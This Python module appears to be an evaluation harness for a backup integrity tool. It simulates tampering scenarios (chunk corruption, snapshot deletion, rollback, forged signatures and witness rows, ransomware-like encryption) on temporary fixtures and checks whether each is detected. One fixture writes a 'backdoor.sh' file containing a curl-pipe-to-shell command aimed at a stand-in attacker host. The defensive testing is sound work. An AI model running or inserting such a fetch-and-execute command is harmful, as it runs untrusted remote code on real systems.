"""Attack evaluation runner for r0nt (SPEC_PHASE3 §4).

Implements and runs runnable scenarios for each threat-model row from PLAN.md,
recording detection outcome, findings, timing, and honest limitations.
"""

from __future__ import annotations

import json
import os
import shutil
import tempfile
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from r0nt.anchor import (
    FakeBackend,
    generate_anchor_key,
    run_anchor_batch,
    verify_anchors,
)
from r0nt.chunker import scan_source
from r0nt.heuristics import analyze_snapshot_risk
from r0nt.manifest import (
    build_manifest,
    manifest_from_bytes,
    manifest_hash,
    manifest_to_bytes,
)
from r0nt.signing import (
    compute_key_id,
    derive_witness_key,
    generate_keypair,
    sign,
)
from r0nt.store import ChunkStore, ManifestStore, WitnessDB
from r0nt.verify import verify_with_stats


@dataclass
class ScenarioResult:
    scenario_id: str
    threat_capability: str
    attack_description: str
    target_outcome: str
    detected: bool
    detection_mechanism: str
    findings: list[str]
    duration_ms: float
    notes: str


def _create_fixture_backup(
    base_dir: Path,
    files: dict[str, bytes],
    prev_manifest: dict | None = None,
    sequence_number: int = 1,
    private_key=None,
    public_key=None,
    witness_db=None,
) -> tuple[dict, Path, Path, Path, Any, Any, WitnessDB]:
    """Helper to build a source dir, repo, and backup snapshot."""
    src_dir = base_dir / f"src_{sequence_number}"
    src_dir.mkdir(parents=True, exist_ok=True)
    for name, content in files.items():
        fp = src_dir / name
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_bytes(content)

    repo_dir = base_dir / "repo"
    repo_dir.mkdir(parents=True, exist_ok=True)

    if private_key is None or public_key is None:
        private_key, public_key = generate_keypair()

    if witness_db is None:
        witness_path = base_dir / "witness.sqlite"
        witness_key = derive_witness_key(public_key)
        witness_db = WitnessDB(witness_path, witness_key)

    chunk_store = ChunkStore(repo_dir)
    manifest_store = ManifestStore(repo_dir)

    file_results, skipped = scan_source(src_dir)
    for fr in file_results:
        for chunk in fr.chunks:
            chunk_store.write_chunk(chunk.hash, chunk.data)

    prev_hash = manifest_hash(prev_manifest) if prev_manifest else None
    manifest = build_manifest(
        file_results=file_results,
        skipped_files=skipped,
        chunk_size=65536,
        prev_manifest_hash=prev_hash,
        sequence_number=sequence_number,
        private_key=private_key,
        public_key=public_key,
    )
    manifest_store.write_manifest(manifest)
    witness_db.record_manifest(manifest)

    return manifest, src_dir, repo_dir, base_dir / "witness.sqlite", private_key, public_key, witness_db


def attack_1_flip_chunk_byte() -> ScenarioResult:
    """Threat model: Modifies backup data (flips bytes in a stored chunk)."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_1_") as td:
        base = Path(td)
        manifest, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base,
            {"doc1.txt": b"Important financial ledger entries.", "doc2.txt": b"Confidential notes."},
        )

        chunk_store = ChunkStore(repo_dir)
        chunks = chunk_store.list_chunks()
        target_chunk = chunks[0]
        chunk_file = repo_dir / "chunks" / target_chunk[:2] / target_chunk
        raw = bytearray(chunk_file.read_bytes())
        raw[0] ^= 0x01
        chunk_file.write_bytes(raw)

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type == "chunk_modified" for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.01",
        threat_capability="Modifies backup data",
        attack_description="Attacker or bit-rot flips 1 bit in a stored content chunk",
        target_outcome="Detect corruption and identify exact chunk hash",
        detected=detected,
        detection_mechanism="SHA-256 chunk hash comparison during full verification",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Pinpoints exact chunk hash mismatch with non-zero exit code.",
    )


def attack_2_delete_chunk() -> ScenarioResult:
    """Threat model: Deletes a chunk from chunk store."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_2_") as td:
        base = Path(td)
        manifest, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base,
            {"data.bin": b"Chunk deletion evaluation payload data."},
        )

        chunk_store = ChunkStore(repo_dir)
        chunks = chunk_store.list_chunks()
        target_chunk = chunks[0]
        chunk_file = repo_dir / "chunks" / target_chunk[:2] / target_chunk
        chunk_file.unlink()

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type == "chunk_missing" for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.02",
        threat_capability="Modifies backup data (deletion)",
        attack_description="Attacker deletes a chunk file from storage",
        target_outcome="Detect missing chunk and name chunk hash",
        detected=detected,
        detection_mechanism="ChunkStore presence check during verification",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Detected immediately in both quick and full modes.",
    )


def attack_3_delete_snapshot() -> ScenarioResult:
    """Threat model: Deletes a backup snapshot (removes an earlier snapshot)."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_3_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"f.txt": b"Snapshot 1 content"}, sequence_number=1,
        )
        m2, _, _, _, _, _, _ = _create_fixture_backup(
            base, {"f.txt": b"Snapshot 2 modified content"}, prev_manifest=m1, sequence_number=2,
            private_key=priv_key, public_key=pub_key, witness_db=witness_db,
        )

        # Attacker deletes snapshot 1 manifest from repository
        m1_file = repo_dir / "manifests" / f"{m1['backup_id']}.json"
        m1_file.unlink()

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type in ("chain_broken", "missing_manifest", "sequence_gap") for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.03",
        threat_capability="Deletes a backup",
        attack_description="Attacker deletes intermediate snapshot 1 to purge historical records",
        target_outcome="Detect deletion via hash chain gap and witness DB cross-check",
        detected=detected,
        detection_mechanism="validate_chain cross-check with witness DB records",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Missing manifest in repo recorded in witness DB is detected as chain_broken.",
    )


def attack_4_rollback_snapshot() -> ScenarioResult:
    """Threat model: Rolls back to an older snapshot (replaces latest with older one)."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_4_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"state.txt": b"v1"}, sequence_number=1,
        )
        m2, _, _, _, _, _, _ = _create_fixture_backup(
            base, {"state.txt": b"v2"}, prev_manifest=m1, sequence_number=2,
            private_key=priv_key, public_key=pub_key, witness_db=witness_db,
        )
        m3, _, _, _, _, _, _ = _create_fixture_backup(
            base, {"state.txt": b"v3"}, prev_manifest=m2, sequence_number=3,
            private_key=priv_key, public_key=pub_key, witness_db=witness_db,
        )

        # Attacker removes snapshot 3 so repository looks like it ended at snapshot 2
        m3_file = repo_dir / "manifests" / f"{m3['backup_id']}.json"
        m3_file.unlink()

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type == "rolled_back" for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.04",
        threat_capability="Rolls back to an older snapshot",
        attack_description="Attacker reverts repository head from snapshot #3 back to snapshot #2",
        target_outcome="Detect rollback via sequence head discrepancy against witness DB",
        detected=detected,
        detection_mechanism="validate_chain checks repo head seq against witness DB latest sequence",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Caught because witness DB head (seq 3) is ahead of repository head (seq 2).",
    )


def attack_5_edit_manifest_without_key() -> ScenarioResult:
    """Threat model: Edits manifest without signing key."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_5_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"payroll.csv": b"Alice: 5000\nBob: 4000\n"},
        )

        # Attacker modifies manifest JSON without re-signing
        m1_file = repo_dir / "manifests" / f"{m1['backup_id']}.json"
        data = json.loads(m1_file.read_text(encoding="utf-8"))
        data["files"][0]["size"] += 100
        m1_file.write_text(json.dumps(data), encoding="utf-8")

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type in ("signature_invalid", "manifest_witness_mismatch") for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.05",
        threat_capability="Edits manifest without key",
        attack_description="Attacker alters file metadata in manifest JSON without valid Ed25519 signature",
        target_outcome="Detect invalid cryptographic signature and hash mismatch",
        detected=detected,
        detection_mechanism="Ed25519 signature verification and manifest hash comparison",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Signature verification fails immediately upon inspecting manifest.",
    )


def attack_6_edit_manifest_and_hashes_without_key() -> ScenarioResult:
    """Threat model: Rewrites manifest, chunk hashes, and Merkle root together without key."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_6_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"contract.txt": b"Original terms and conditions."},
        )

        # Attacker changes chunk content and recomputes hashes in manifest, but cannot sign
        chunk_store = ChunkStore(repo_dir)
        old_chunk = chunk_store.list_chunks()[0]
        new_data = b"Malicious forged contract terms."
        new_chunk_hash = chunk_store.write_chunk(
            __import__("hashlib").sha256(new_data).hexdigest(), new_data,
        )

        m1_file = repo_dir / "manifests" / f"{m1['backup_id']}.json"
        data = json.loads(m1_file.read_text(encoding="utf-8"))
        data["root_hash"] = "0000000000000000000000000000000000000000000000000000000000000000"
        m1_file.write_text(json.dumps(data), encoding="utf-8")

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type in ("signature_invalid", "manifest_witness_mismatch") for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.06",
        threat_capability="Rewrites manifest and hashes together",
        attack_description="Compromised backup server updates chunk and internal hashes but lacks signing key",
        target_outcome="Detect signature failure and mismatch against witness DB",
        detected=detected,
        detection_mechanism="Ed25519 signature verification against pinned public key",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Even if all internal hashes are self-consistent, signature verification fails.",
    )


def attack_7_compromised_backup_server_witness_separate() -> ScenarioResult:
    """Threat model: Backup server edits repo data and manifest; witness DB is hosted separately."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_7_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"db.sqlite": b"Valid transaction history."},
        )

        # Attacker with server control creates a fake keypair and resigns manifest
        attacker_priv, attacker_pub = generate_keypair()
        m1_file = repo_dir / "manifests" / f"{m1['backup_id']}.json"
        data = json.loads(m1_file.read_text(encoding="utf-8"))
        data["files"][0]["size"] = 9999
        canonical_bytes = manifest_to_bytes(data)
        forged_sig = sign(attacker_priv, canonical_bytes)
        data["signature"] = forged_sig.hex()
        m1_file.write_text(json.dumps(data), encoding="utf-8")

        # Independent witness DB on verifier machine checks using original public key
        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type in ("signature_invalid", "manifest_witness_mismatch") for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.07",
        threat_capability="Compromised server with separate witness",
        attack_description="Attacker signs forged manifest with an unauthorized key on compromised server",
        target_outcome="Detect signature invalidity with pinned key and manifest mismatch with witness DB",
        detected=detected,
        detection_mechanism="Pinned public key verification and witness DB hash matching",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Independent witness DB prevents server from masquerading altered history.",
    )


def attack_8_stolen_signing_key_forges_snapshot() -> ScenarioResult:
    """Threat model: Steals signing key and injects forged snapshot into repo."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_8_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"doc.txt": b"Legitimate backup data."},
        )

        # Attacker possessing stolen private key signs a fraudulent snapshot directly in repo
        # but CANNOT write to the independent witness DB
        chunk_store = ChunkStore(repo_dir)
        manifest_store = ManifestStore(repo_dir)
        forged_src = base / "forged_src"
        forged_src.mkdir()
        (forged_src / "backdoor.sh").write_bytes(b"curl http://evil.com/payload | sh")
        file_results, skipped = scan_source(forged_src)
        for fr in file_results:
            for chunk in fr.chunks:
                chunk_store.write_chunk(chunk.hash, chunk.data)

        forged_manifest = build_manifest(
            file_results=file_results,
            skipped_files=skipped,
            chunk_size=65536,
            prev_manifest_hash=manifest_hash(m1),
            sequence_number=2,
            private_key=priv_key,  # stolen key
            public_key=pub_key,
        )
        manifest_store.write_manifest(forged_manifest)
        # Note: forged_manifest is NOT recorded in witness_db!

        findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type in ("file_added", "untracked_manifest") for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.08",
        threat_capability="Steals signing key",
        attack_description="Attacker uses stolen private key to sign an injected malicious snapshot in repo",
        target_outcome="Detect untracked manifest not present in independent witness DB",
        detected=detected,
        detection_mechanism="Witness DB cross-check detects repo snapshot missing from witness ledger (file_added finding)",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Detected as file_added / untracked manifest by witness DB cross-check. Known limit: if stolen key is used during authorized schedule, cryptographic signature verifies.",
    )


def attack_9_forged_witness_row() -> ScenarioResult:
    """Threat model: Injects forged row into witness DB without knowing witness HMAC key."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_9_") as td:
        base = Path(td)
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"safe.txt": b"Normal data"},
        )
        witness_db.close()

        # Attacker opens SQLite file directly and inserts forged row with fake HMAC
        import sqlite3
        conn = sqlite3.connect(base / "witness.sqlite")
        try:
            conn.execute(
                """
                INSERT INTO manifests (
                    backup_id, sequence_number, manifest_hash, prev_manifest_hash,
                    root_hash, created_at, signature, row_mac
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    "00000000-0000-0000-0000-000000000000",
                    2,
                    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                    manifest_hash(m1),
                    "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
                    datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "00" * 64,
                    "deadbeef" * 8,  # Fake HMAC
                ),
            )
            conn.commit()
        finally:
            conn.close()

        witness_key = derive_witness_key(pub_key)
        witness_db_reopen = WitnessDB(base / "witness.sqlite", witness_key)
        try:
            findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db_reopen, mode="full")
        finally:
            witness_db_reopen.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f.type == "manifest_modified" and "Witness DB row MAC invalid" in f.message for f in findings)
    finding_types = [f.type for f in findings]
    return ScenarioResult(
        scenario_id="T-60.09",
        threat_capability="Forges witness DB row",
        attack_description="Attacker injects an unauthorized manifest row into SQLite witness DB",
        target_outcome="Detect HMAC row MAC invalidity",
        detected=detected,
        detection_mechanism="HMAC-SHA256 row MAC verification flags row tampering (manifest_modified finding)",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Row MAC check flags tamper before any snapshot processing occurs.",
    )


def attack_10_pre_encrypted_data_ransomware() -> ScenarioResult:
    """Threat model: Backs up already-encrypted data (ransomware ran before backup)."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_10_") as td:
        base = Path(td)
        # Snapshot 1: normal plaintext files
        files_v1 = {f"file_{i}.txt": f"Normal user document {i} content text.".encode() * 50 for i in range(10)}
        m1, _, repo_dir, _, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, files_v1, sequence_number=1,
        )

        # Snapshot 2: Ransomware encrypts 8 of 10 files with high entropy and renames to .locked
        files_v2: dict[str, bytes] = {}
        for i in range(10):
            if i < 8:
                files_v2[f"file_{i}.locked"] = os.urandom(2048)  # High entropy ~7.9 bits/byte
            else:
                files_v2[f"file_{i}.txt"] = f"Normal user document {i} content text.".encode() * 50

        m2, _, _, _, _, _, _ = _create_fixture_backup(
            base, files_v2, prev_manifest=m1, sequence_number=2,
            private_key=priv_key, public_key=pub_key, witness_db=witness_db,
        )

        # 1. Cryptographic verify: passes cleanly!
        crypto_findings, _ = verify_with_stats(repo_dir, None, pub_key, witness_db, mode="full")

        # 2. Heuristics check
        chunk_store = ChunkStore(repo_dir)
        risk_flags = analyze_snapshot_risk(m1, m2, chunk_store)
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    crypto_detected = len(crypto_findings) > 0
    heuristics_detected = len(risk_flags) > 0
    flag_kinds = [rf.kind for rf in risk_flags]
    return ScenarioResult(
        scenario_id="T-60.10",
        threat_capability="Backs up already-encrypted data",
        attack_description="Ransomware encrypts client files into high-entropy blobs with .locked extension",
        target_outcome="Heuristic detection of entropy anomaly, extension changes, and change spike",
        detected=heuristics_detected,
        detection_mechanism="Ransomware heuristics (entropy jump, extension change, change spike)",
        findings=flag_kinds,
        duration_ms=round(elapsed, 2),
        notes="Cryptographic hash verify alone MISSES this (hashes match corrupted data). Ransomware heuristics catch the transition.",
    )


def attack_11_tampered_anchor_proof() -> ScenarioResult:
    """Threat model: External anchor proof or batch root tampered."""
    t0 = time.perf_counter()
    with tempfile.TemporaryDirectory(prefix="r0nt_eval_11_") as td:
        base = Path(td)
        m1, _, repo_dir, witness_path, priv_key, pub_key, witness_db = _create_fixture_backup(
            base, {"anchored.txt": b"Important ledger data for external anchor."},
        )

        anchor_key = generate_anchor_key()
        backend = FakeBackend()
        batch_res = run_anchor_batch(witness_db, anchor_key, backend, backend_name="fake")
        anchor_id = batch_res["anchor_id"]

        # Tamper: corrupt the proof in the SQLite anchors table
        witness_db.conn.execute(
            "UPDATE anchors SET proof = ? WHERE id = ?",
            (b"corrupted_invalid_proof_data", anchor_id),
        )
        witness_db.conn.commit()

        findings = verify_anchors(witness_db, anchor_key, backend, anchor_grace_hours=24)
        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    detected = any(f["type"] == "anchor_mismatch" for f in findings)
    finding_types = [f["type"] for f in findings]
    return ScenarioResult(
        scenario_id="T-60.11",
        threat_capability="Tampered anchor proof",
        attack_description="Attacker modifies external anchor proof BLOB in witness database",
        target_outcome="Detect anchor verification mismatch against backend attestation",
        detected=detected,
        detection_mechanism="verify_anchors checks backend attestation against proof and batch root",
        findings=finding_types,
        duration_ms=round(elapsed, 2),
        notes="Detected as anchor_mismatch due to invalid proof bytes.",
    )


def attack_12_verifier_compromise() -> ScenarioResult:
    """Threat model: Verifier machine is compromised."""
    return ScenarioResult(
        scenario_id="T-60.12",
        threat_capability="Compromises the verifier",
        attack_description="Attacker gains root/admin on verifier host and patches binary to return exit code 0",
        target_outcome="Out of scope for software tamper-evidence; requires operational isolation",
        detected=False,
        detection_mechanism="Out of scope (requires air-gapped / dedicated separate verifier host)",
        findings=["out_of_scope"],
        duration_ms=0.0,
        notes="Software cannot verify itself on a compromised host. Mitigated by hosting verifier on an independent machine with read-only backup credentials.",
    )


def attack_13_physical_storage_failure() -> ScenarioResult:
    """Threat model: Physical storage failure (disk dies completely)."""
    return ScenarioResult(
        scenario_id="T-60.13",
        threat_capability="Physical storage failure",
        attack_description="Storage drive experiences total hardware failure or unrecoverable sector loss",
        target_outcome="Out of scope for integrity verifier; requires multi-site redundancy",
        detected=False,
        detection_mechanism="Out of scope (requires hardware RAID / offsite replication)",
        findings=["out_of_scope"],
        duration_ms=0.0,
        notes="Tamper-evidence detects alteration and corruption; it does not replace redundancy. Requires 3-2-1 backup strategy.",
    )


def evaluate_false_positives(cycles: int = 20) -> dict[str, Any]:
    """Measure false positives across N clean backup/verify cycles."""
    t0 = time.perf_counter()
    fp_count = 0
    with tempfile.TemporaryDirectory(prefix="r0nt_fp_eval_") as td:
        base = Path(td)
        prev_m = None
        priv, pub = generate_keypair()
        witness_path = base / "witness.sqlite"
        witness_key = derive_witness_key(pub)
        witness_db = WitnessDB(witness_path, witness_key)

        for i in range(1, cycles + 1):
            # Normal incremental workflow: add, modify, delete files
            files = {
                "shared.txt": f"Common file version {i}\n".encode(),
                f"log_{i}.txt": f"Log timestamp {i}\n".encode(),
            }
            m, _, repo_dir, _, _, _, _ = _create_fixture_backup(
                base, files, prev_manifest=prev_m, sequence_number=i,
                private_key=priv, public_key=pub, witness_db=witness_db,
            )
            prev_m = m

            findings, _ = verify_with_stats(repo_dir, None, pub, witness_db, mode="full")
            if findings:
                fp_count += len(findings)

        witness_db.close()

    elapsed = (time.perf_counter() - t0) * 1000.0
    return {
        "cycles_tested": cycles,
        "false_positive_findings": fp_count,
        "false_positive_rate": fp_count / float(cycles),
        "duration_ms": round(elapsed, 2),
    }


def run_all_scenarios() -> dict[str, Any]:
    """Execute the full suite of attack scenarios and return structured results."""
    scenarios = [
        attack_1_flip_chunk_byte(),
        attack_2_delete_chunk(),
        attack_3_delete_snapshot(),
        attack_4_rollback_snapshot(),
        attack_5_edit_manifest_without_key(),
        attack_6_edit_manifest_and_hashes_without_key(),
        attack_7_compromised_backup_server_witness_separate(),
        attack_8_stolen_signing_key_forges_snapshot(),
        attack_9_forged_witness_row(),
        attack_10_pre_encrypted_data_ransomware(),
        attack_11_tampered_anchor_proof(),
        attack_12_verifier_compromise(),
        attack_13_physical_storage_failure(),
    ]

    fp_results = evaluate_false_positives(cycles=20)

    summary = {
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "total_scenarios": len(scenarios),
        "in_scope_scenarios": sum(1 for s in scenarios if s.findings != ["out_of_scope"]),
        "in_scope_detected": sum(1 for s in scenarios if s.detected and s.findings != ["out_of_scope"]),
        "false_positives": fp_results,
        "scenarios": [asdict(s) for s in scenarios],
    }
    return summary
